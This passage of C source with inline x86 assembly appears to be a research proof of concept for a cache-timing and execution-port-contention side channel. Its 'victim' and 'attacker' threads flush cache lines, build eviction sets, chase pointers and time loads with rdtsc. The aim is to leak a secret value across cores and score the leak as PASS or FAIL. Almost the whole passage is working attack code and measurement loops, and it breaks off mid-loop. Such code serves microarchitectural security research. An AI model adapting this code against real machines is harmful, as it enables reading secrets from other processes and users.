void* contention0_victim_threadAB(void)
{
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
  _mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 29) & 0x1);

	sync = ((start + (0x1 << 30)) >> 30) << 30;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 30) != (sync >> 30)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);



	while(flag != 1){};
	
	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");
 
	asm(
 	R"(
  
	lfence
	lfence
	lfence
  vzeroall

	vmovdqa (%2), %%ymm0
	

	mov (%1), %%rbx
  clflush (%1)
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	.REPT	1024
		NOP
	.ENDR
 
  mov %4, %%rcx
	mfence
  movl (%%rcx), %%r12d 
	lfence
 
	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
 
	mov %%ebx, %%eax
	movl (%%rcx,%%rax,1), %%r8d	
 
.REPT   44
        vsqrtpd %%ymm1,%%ymm1
.ENDR
  vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ebx

.REPT	8
        vsqrtpd %%ymm2,%%ymm2
        vsqrtpd %%ymm3,%%ymm3
        vsqrtpd %%ymm4,%%ymm4
        vsqrtpd %%ymm5,%%ymm5
        vsqrtpd %%ymm6,%%ymm6
        vsqrtpd %%ymm7,%%ymm7
        vsqrtpd %%ymm8,%%ymm8
        vsqrtpd %%ymm9,%%ymm9
        vsqrtpd %%ymm10,%%ymm10
        vsqrtpd %%ymm11,%%ymm11
        vsqrtpd %%ymm12,%%ymm12
        vsqrtpd %%ymm13,%%ymm13
        vsqrtpd %%ymm14,%%ymm14
        vsqrtpd %%ymm15,%%ymm15 
.ENDR
	lfence
	lfence
	lfence
 
 	sub %%r12d, %%r8d
  movl %%r8d, %3

)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);

	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");	

	flag = 0;

	while(flag != 7){};

	return cycle;
}

void* contention1_victim_threadBA(void)
{
	void *addr1 = attackerAddr[0];
	void *addr2 = attackerAddr[1];
	void *addr3 = attackerAddr[2];
	void *addr4 = attackerAddr[3];
	void *addr5 = attackerAddr[4];
	void *addr6 = attackerAddr[5];
	void *addr7 = attackerAddr[6];
	void *addr8 = attackerAddr[7];
	void *addr9 = attackerAddr[8];
	void *addr10 = attackerAddr[9];
	void *addr11 = attackerAddr[10];
	void *addr12 = attackerAddr[11];
	void *addr13 = attackerAddr[12];
	void *addr14 = attackerAddr[13];
	void *addr15 = attackerAddr[14];
	void *addr16 = attackerAddr[15];
	void *addr17 = attackerAddr[16];
	void *addr18 = attackerAddr[17];
	void *addr19 = attackerAddr[18];
	void *addr20 = attackerAddr[19];
	void *addr21 = attackerAddr[20];
	void *addr22 = attackerAddr[21];
	void *addrA = attackerAddr[22];
	void *addrB = attackerAddr[23];
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;
  
	setaffinity(VIC);
	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);
	_mm_clflush(addrA);
	_mm_clflush(addrB);
	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);
 
  _mm_clflush(bppppp);
  _mm_clflush(bpppp);
  _mm_clflush(bppp);
  _mm_clflush(bpp);
 	_mm_clflush(bp);
  
  
	uint32_t lo1,hi1,lo2,hi2;
	uint64_t time1,time2,timet1,timet2;
	uint32_t temp;

	uint64_t time2s[SAMPLES];
	uint64_t diffs[SAMPLES];

	uint64_t start_interval[SAMPLES];
	uint64_t first_time[SAMPLES];
	uint64_t second_time[SAMPLES];

	// Synchronize

	uint64_t start;
	uint64_t sync;
	do {
		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}
	while((start >> 29) & 0x1);

	sync = ((start + (0x1 << 30)) >> 30) << 30;
	//printf("[1] start:%lld  check:%lld\n", start, sync);

	while((start >> 30) != (sync >> 30)) {
    		__asm__ __volatile__ ("rdtsc" : "=a" (lo1), "=d" (hi1));
		start = ((uint64_t)hi1 << 32) | lo1;
	}  
	sync = start;
	//printf("[2] Sync: %llx\n", start);



	while(flag != 1){};
	
	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");
 
	asm(
 	R"(
  
	lfence
	lfence
	lfence
  vzeroall
	movl $15, %%eax
	vmovq %%rax, %%xmm2
	vmovdqa (%2), %%ymm0
	

	mov (%1), %%rbx
  clflush (%1)
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
  clflush (%%rbx)
  mov %%rcx, %%rbx
	.REPT	1024
		NOP
	.ENDR
 
  mov %4, %%rcx
	mfence
  movl (%%rcx), %%r12d 
	lfence
 
	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
 
	mov %%ebx, %%eax
	movl (%%rcx,%%rax,1), %%r8d	
 
.REPT   44
        vsqrtpd %%ymm1,%%ymm1
.ENDR
  vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ebx


.REPT	8
        vsqrtpd %%ymm2,%%ymm3
        vsqrtpd %%ymm2,%%ymm4
        vsqrtpd %%ymm2,%%ymm5
        vsqrtpd %%ymm2,%%ymm6
        vsqrtpd %%ymm2,%%ymm7
        vsqrtpd %%ymm2,%%ymm8
        vsqrtpd %%ymm2,%%ymm9
        vsqrtpd %%ymm2,%%ymm10
        vsqrtpd %%ymm2,%%ymm11
        vsqrtpd %%ymm2,%%ymm12
        vsqrtpd %%ymm2,%%ymm13
        vsqrtpd %%ymm2,%%ymm14
        vsqrtpd %%ymm2,%%ymm15 
.ENDR

	lfence
	lfence
	lfence
 
 	sub %%r12d, %%r8d
  movl %%r8d, %3

)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%r12", "%r13", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
);

	asm volatile("lfence\n");
	
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);

	asm volatile("lfence\n");	

	flag = 0;

	while(flag != 7){};

	return cycle;
}

int main(void)
{

	pthread_t t;
	pthread_create(&t, NULL, clock_thread, NULL);
	while (ticks == 0) {}
	printf("Started Clock Thread\n");

	setaffinity(VIC);


	/*void * buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
 	if (buffer == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}*/

	FILE *fp = fopen("pageids.txt", "r");
	size_t read;
	char *line = NULL;
	size_t flen = 0;

	for(int i = 0; i < 200; i++) {
		if ((read = getline(&line, &flen, fp)) != -1) {
			//printf("Retrieved line of length %zu:\n", read);
			//printf("%s", line);
		}
		else {
		  printf("[!] Cannot read line\n");
		  exit(1);
		}
		char *page;
		int id = atoi(line);
		//printf("%d\n", id);
		page = shmat(id, NULL, 0);
		if (page == MAP_FAILED) {
			perror("shmat");
			return 1;
		} 

		// @page now maps to the physical huge page(s) allocated by shm-create,
		// enjoy.

		unsigned int page_frame_number = get_page_frame_number_of_address(page);
		unsigned int old_page_frame = page_frame_number;
		unsigned int pageoff = 0x1000;
		//printf("shmem worked on id %d!, %p %x\n", id, page, page_frame_number);
		shmctl(id, IPC_RMID, NULL);
		segbuffer[i] = page;
	}

	for(int i = 0; i < 200; i++) {
		//printf("%p\n", segbuffer[i]); 
	}
	printf("%p\n", segbuffer[199]); 
	void *buffer = segbuffer[199];
    printf("\n[+][0] Initiate search for 3 eviction sets\n");
	while(setup_everything(buffer) < 5000) {
		my_set++;
		my_set %= 1024;	
	}

/*
	printf("%f", sAB_ex[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", sAB_ex[j]);
	}
	printf("\n");
	printf("%f", sAB_du[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", sAB_du[j]);
	}
	printf("\n");
	printf("%f", sBA_ex[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", sBA_ex[j]);
	}
	printf("\n");
	printf("%f", sBA_du[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", sBA_du[j]);
	}
	printf("\n");
	printf("%f", cAB_ex[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", cAB_ex[j]);
	}
	printf("\n");
	printf("%f", cAB_du[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", cAB_du[j]);
	}
	printf("\n");
	printf("%f", cBA_ex[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", cBA_ex[j]);
	}
	printf("\n");
	printf("%f", cBA_du[0]);
	for(int j = 1; j < 100; j++) {
		printf(",%f", cBA_du[j]);
	}
	printf("\n");
*/
	//check addresses
	for(int g = 0; g < 24; g++) {
		if(get_cache_set_index((uint64_t)&attackerAddr[0], 3) == my_set)
			printf("[!] attackerAddr[%d] same set\n", g);
	}
	if(get_cache_set_index((uint64_t)&flag, 3) == my_set)
			printf("[!] flag same set\n");
	//printf("[+] Done Setup\n\n");

/*
   float sum = 0;
   int iter = 0;
	printf("0");
	for(int i = 0; i < 20000; i++) {
		//load_A_no();
		//load_A_con();
		int k = (int)pointer_chase();
    if(k > 0) {
      sum +=k;
      iter++;
    }
   	printf(",%d", k);
	}
	printf("\n", time);
 
    //printf("pointer_chase %f\n", sum/iter);
   sum = 0;
      iter = 0;
	printf("0");
	for(int i = 0; i < 10000; i++) {
		int k = (int)load_A_no();
       if(k > 0) {
      sum += k;
      iter++;
    }
    printf(",%d", k);
		//load_A_con();
		//pointer_chase();
	}
	printf("\n", time);
    //printf("load_A_no %f\n", sum/iter);
   sum = 0;
   iter = 0;
	printf("0");
	for(int i = 0; i < 10000; i++) {
		//load_A_no();
		int k = (int)load_A_con();
       if(k > 0) {
      sum +=k;
      iter++;
    }
    printf(",%d", k);
		//pointer_chase();
	}
	printf("\n", time);
    //printf("load_A_con %f\n", sum/iter);

	return;*/

	int workedAB = 0;
	int workedBA = 0;
	int sameAB = 0;
	int sameBA = 0;
	int goneAB = 0;
	int goneBA = 0;
	int dualAB = 0;
	int dualBA = 0;
/*
	atk_id = ATKS;
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	for(int k = 0; k < 100; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started AB Victim Thread\n");	
		if(victim_threadAB()){
			if(timeA > 150 && timeB < 150) {
				workedAB++;
			}
			if(timeA < 150 && timeB < 150) {
				sameAB++;
			}
			if(timeA > 150 && timeB > 150) {
				goneAB++;
			}
			if(timeA < 150 && timeB > 150) {
				dualAB++;
			}
		}
		for(int q = 0; q < 1000000; q++) {}
	}
	printf("[+][2] SMT A-B sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", workedAB, dualAB, goneAB, sameAB, workedAB, dualAB);

	for(int k = 0; k < 100; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started BA Victim Thread\n");	
		if(victim_threadBA()){
			if(timeB > 150 && timeA < 150) {
				workedBA++;
			}
			if(timeA < 150 && timeB < 150) {
				sameBA++;
			}
			if(timeB > 150 && timeA > 150) {
				goneBA++;
			}
			if(timeA > 150 && timeB < 150) {
				dualBA++;
			}

		}
		for(int q = 0; q < 1000000; q++) {}
	}
	printf("[+][2] SMT B-A sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, dualBA);
*/
if(1){
	atk_id = ATKD;
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	for(int x = 0; x < 1; x++) {  
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	for(int k = 0; k < 50; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started AB Victim Thread\n");	
		if(victim_threadAB()){
			if(timeA > 150 && timeB < 150) {
				workedAB++;
			}
			if(timeA < 150 && timeB < 150) {
				sameAB++;
			}
			if(timeA > 150 && timeB > 150) {
				goneAB++;
			}
			if(timeA < 150 && timeB > 150) {
				dualAB++;
			}
		}
		for(int q = 0; q < 1000000; q++) {}
	}
	//printf(",%d", workedAB);
	mAB_ex[x] = (float)workedAB/100;
	mAB_du[x] = (float)dualAB/100;
	}
	printf("[+][3] Multi-Core Static A-B sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n", workedAB, dualAB, goneAB, sameAB, workedAB, dualAB);

	for(int x = 0; x < 1; x++) {  
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	for(int k = 0; k < 50; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started BA Victim Thread\n");	
		if(victim_threadBA()){
			if(timeB > 150 && timeA < 150) {
				workedBA++;
			}
			if(timeA < 150 && timeB < 150) {
				sameBA++;
			}
			if(timeB > 150 && timeA > 150) {
				goneBA++;
			}
			if(timeA > 150 && timeB < 150) {
				dualBA++;
			}

		}
		for(int q = 0; q < 1000000; q++) {}
	}
	//printf(",%d", workedBA);
	mBA_ex[x] = (float)workedBA/100;
	mBA_du[x] = (float)dualBA/100;
	}
	printf("[+][3] Multi-Core Static B-A sequence:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/100] vs dual[%0.2d/100]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, dualBA);

  if(0) {
  	printf("%f", mAB_ex[0]);
  	for(int j = 1; j < 10; j++) {
  		printf(",%f", mAB_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mAB_du[0]);
  	for(int j = 1; j < 10; j++) {
  		printf(",%f", mAB_du[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_ex[0]);
  	for(int j = 1; j < 10; j++) {
  		printf(",%f", mBA_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_du[0]);
  	for(int j = 1; j < 10; j++) {
  		printf(",%f", mBA_du[j]);
  	}
  	printf("\n");
  }
}
/*
	atk_id = ATKS;
	workedAB = 0;
	workedBA = 0;
	sameAB = 0;
	sameBA = 0;
	goneAB = 0;
	goneBA = 0;
	dualAB = 0;
	dualBA = 0;
	for(int k = 0; k < 100; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started AB Victim Thread\n");	
    int loadB_time = no_contention_victim_threadAB();
    printf(",%d", loadB_time);
		if(loadB_time > 180 && loadB_time < 210){
			if(timeA > 150 && timeB < 150) {
				workedAB++;
			}
			if(timeA < 150 && timeB < 150) {
				sameAB++;
			}
			if(timeA > 150 && timeB > 150) {
				goneAB++;
			}
			if(timeA < 150 && timeB > 150) {
				dualAB++;
			}
		}
		for(int q = 0; q < 1000000; q++) {}
	}
	printf("\n[+][4] SMT No Contention Victim:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n", workedAB, dualAB, goneAB, sameAB, workedAB, workedAB+dualAB+sameAB+goneAB, dualAB, workedAB+dualAB+sameAB+goneAB);

	for(int k = 0; k < 100; k++) {
		flag = 2;
		pthread_t a1;
		pthread_create(&a1, NULL, attacker_thread, NULL);
		//printf("[+] Started BA Victim Thread\n");	
    int loadB_time = contention_victim_threadBA();
    printf(",%d", loadB_time);
		if(loadB_time > 180 && loadB_time < 210){
			if(timeB > 150 && timeA < 150) {
				workedBA++;
			}
			if(timeA < 150 && timeB < 150) {
				sameBA++;
			}
			if(timeB > 150 && timeA > 150) {
				goneBA++;
			}
			if(timeA > 150 && timeB < 150) {
				dualBA++;
			}

		}
		for(int q = 0; q < 1000000; q++) {}
	}
	printf("\n[+][4] SMT Contention Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, workedBA+dualBA+goneBA+sameBA, dualBA, workedBA+dualBA+goneBA+sameBA);
*/

int dump_size = 1;

if(0){
	atk_id = ATKD;

  /* Multi-Core No Contention Victim */
	for(int x = 0; x < dump_size; x++) {  
  	workedAB = 0;
  	workedBA = 0;
  	sameAB = 0;
  	sameBA = 0;
  	goneAB = 0;
  	goneBA = 0;
  	dualAB = 0;
  	dualBA = 0;
  	for(int k = 0; k < 100; ) {
  		flag = 2;
  		pthread_t a1;
  		pthread_create(&a1, NULL, attacker_thread, NULL);
  		//printf("[+] Started AB Victim Thread\n");	
      int loadB_time = no_contention_victim_threadAB();
  		if(1){
  			if(timeA > 150 && timeB < 150) {
  				workedAB++;
  			}
  			if(timeA < 150 && timeB < 150) {
  				sameAB++;
  			}
  			if(timeA > 150 && timeB > 150) {
  				goneAB++;
  			}
  			if(timeA < 150 && timeB > 150) {
  				dualAB++;
  			}
        k++;
  		}
	  }
  	mAB_ex[x] = (float)workedAB/100;
  	mAB_du[x] = (float)dualAB/100;
	}

	printf("\n\n[+][4] Multi-Core VDIVPD No Contention Victim:  A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n", workedAB, dualAB, goneAB, sameAB, workedAB, workedAB+dualAB+sameAB+goneAB, dualAB, workedAB+dualAB+sameAB+goneAB);

  if(0) {
  	printf("%f", mAB_ex[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mAB_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mAB_du[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mAB_du[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_ex[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mBA_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_du[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mBA_du[j]);
  	}
  	printf("\n");
  }

  /* Multi-Core Contention Victim */
	for(int x = 0; x < dump_size; x++) {  
  	workedAB = 0;
  	workedBA = 0;
  	sameAB = 0;
  	sameBA = 0;
  	goneAB = 0;
  	goneBA = 0;
  	dualAB = 0;
  	dualBA = 0; 
  	for(int k = 0; k < 100;) {
  		flag = 2;
  		pthread_t a1;
  		pthread_create(&a1, NULL, attacker_thread, NULL);
  		//printf("[+] Started BA Victim Thread\n");	
      int loadB_time = contention_victim_threadBA();
  		if(1){
  			if(timeB > 150 && timeA < 150) {
  				workedBA++;
  			}
  			if(timeA < 150 && timeB < 150) {
  				sameBA++;
  			}
  			if(timeB > 150 && timeA > 150) {
  				goneBA++;
  			}
  			if(timeA > 150 && timeB < 150) {
  				dualBA++;
  			}
  	      k++;
  		}
  	}
  	mBA_ex[x] = (float)workedBA/100;
  	mBA_du[x] = (float)dualBA/100;
	}

	printf("\n[+][4] Multi-Core VDIVPD Contention Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d]\n\n", dualBA, workedBA, goneBA, sameBA, workedBA, workedBA+dualBA+goneBA+sameBA, dualBA, workedBA+dualBA+goneBA+sameBA);

  if(0) {
  	printf("%f", mAB_ex[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mAB_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mAB_du[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mAB_du[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_ex[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mBA_ex[j]);
  	}
  	printf("\n");
  	printf("%f", mBA_du[0]);
  	for(int j = 1; j < dump_size; j++) {
  		printf(",%f", mBA_du[j]);
  	}
  	printf("\n");
  }
}

int runpass[100];
int runfail[100];
for(int yy = 0; yy<100; yy++) {
  runpass[yy] = 0;
  runfail[yy] = 0;
}

    for(int qq = 0;  qq < OUTER_ITER; qq++) {

        if(1) {
            atk_id = ATKD;

            /* Multi-Core Secret 0 Victim */
            for(int x = 0; x < INNER_ITER; x++) {  
                workedAB = 0;
                workedBA = 0;
                sameAB = 0;
                sameBA = 0;
                goneAB = 0;
                goneBA = 0;
                dualAB = 0;
                dualBA = 0;
                for(int k = 0; k < x; ) {
                    flag = 2;
                    asm volatile("lfence\n");
                    pthread_t a1;
                    pthread_create(&a1, NULL, attacker_thread, NULL);
                    //printf("[+] Started AB Victim Thread\n");
                    Cmask = 0x01;
                    Cbrcond = 10;
                    Cbrcondptr = &brcond;
                    Csecret = 0;	
                    mask = 0x01;
                    brcond = 10;
                    brcondptr = &brcond;
                    secret = 8;
                    int loadB_time = contentionfixed_victim_thread();

                    if(1){
                        if(timeA > 150 && timeB < 150) {
                            workedAB++;
                        }
                        if(timeA < 150 && timeB < 150) {
                            sameAB++;
                        }
                        if(timeA > 150 && timeB > 150) {
                            goneAB++;
                        }
                        if(timeA < 150 && timeB > 150) {
                            dualAB++;
                        }
                        k++;
                    }
                }
                mAB_ex[x] = (float)workedAB/100;
                mAB_du[x] = (float)dualAB/100;

                char pass[] = "PASS";
                char fail[] = "FAIL";
                char * result;
                if(workedAB > dualAB) {
                    result = pass; 
                    runpass[x]++;
                }
                else {
                    result = fail; 
                    runfail[x]++;
                }

                if(qq==0) printf("[+][4][%0.2d] Multi-Core Secret 0 Victim:     A'B[%0.2d] AB'[%0.2d] A'B'[%0.2d] AB[%0.2d]   expected[%0.2d/%0.2d] vs dual[%0.2d/%0.2d] + %s\n", x, workedAB, dualAB, goneAB, sameAB, workedAB, workedAB+dualAB+sameAB+goneAB, dualAB, workedAB+dualAB+sameAB+goneAB, result);

                if((qq%4 == 0) && (x == 39)) {
                    for(int zz = 0; zz < 40; zz++) {
                        printf("PASS[%0.2d] = %d     ", zz, runpass[zz]);
                        printf("FAIL[%0.2d] = %d\n", zz, runfail[zz]);
                    }
                }
            }

            if(0) {
                printf("%f", mAB_ex[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mAB_ex[j]);
                }
                printf("\n");
                printf("%f", mAB_du[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mAB_du[j]);
                }
                printf("\n");
                printf("%f", mBA_ex[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mBA_ex[j]);
                }
                printf("\n");
                printf("%f", mBA_du[0]);
                for(int j = 1; j < dump_size; j++) {
                    printf(",%f", mBA_du[j]);
                }
                printf("\n");
            }

            /* Multi-Core Secret 1 Victim */
            for(int x = 0; x < INNER_ITER; x++) {  
                workedAB = 0;
                workedBA = 0;
                sameAB = 0;
                sameBA = 0;
                goneAB = 0;
                goneBA = 0;
                dualAB = 0;
                dualBA = 0; 
                for(int k = 0; k < x;) {
                    flag = 2;
                    asm volatile("lfence\n");
                    pthread_t a1;
                    pthread_create(&a1, NULL, attacker_thread, NULL);
                    //printf("[+] Started BA Victim Thread\n");	
                    Cmask = 0x01;
                    Cbrcond = 10;
                    Cbrcondptr = &brcond;
                    Csecret = 0xFF;	
                    mask = 0x01;
                    brcond = 10;
                    brcondptr = &brcond;
                    secret = 0;
                    int loadB_time = contentionfixed_victim_thread();
                    if(1){
                        if(timeB > 150 && timeA < 150) {
                            workedBA++;
                        }
                        if(timeA < 150 && timeB < 150) {
